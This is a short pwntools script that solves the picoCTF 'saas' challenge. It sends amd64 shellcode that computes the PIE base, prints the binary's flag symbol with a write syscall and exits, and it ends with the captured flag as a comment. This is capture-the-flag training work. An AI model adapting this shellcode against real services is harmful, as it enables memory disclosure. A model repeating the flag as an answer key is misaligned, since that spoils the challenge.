from pwn import * 

context.log_level = 'debug'
context.arch = 'amd64'
context.os = 'linux'

e = ELF('./saas')
pie_leak_offset = 0x3145-0x7
shellcode = f'''
lea rdi, [rip+{pie_leak_offset}]
mov rdi, [rdi]
add rdi, {e.sym['flag']}

mov rax, 1
mov rsi, rdi
mov rdi, 1
mov rdx, 100
syscall

mov rax, 60
mov rdi, 0
syscall 
'''
# printed already by context.log_level = 'debug'
#print('shellcode:')
#print(shellcode)
payload = asm(shellcode)
#r = process('./saas_patched')
#r = gdb.debug('./saas_patched', 'b *main+186\nc')
r = remote('mars.picoctf.net', 31021) 
r.sendline(payload)
r.interactive()

# picoCTF{f0ll0w_th3_m4p_t0_g3t_th3_fl4g}

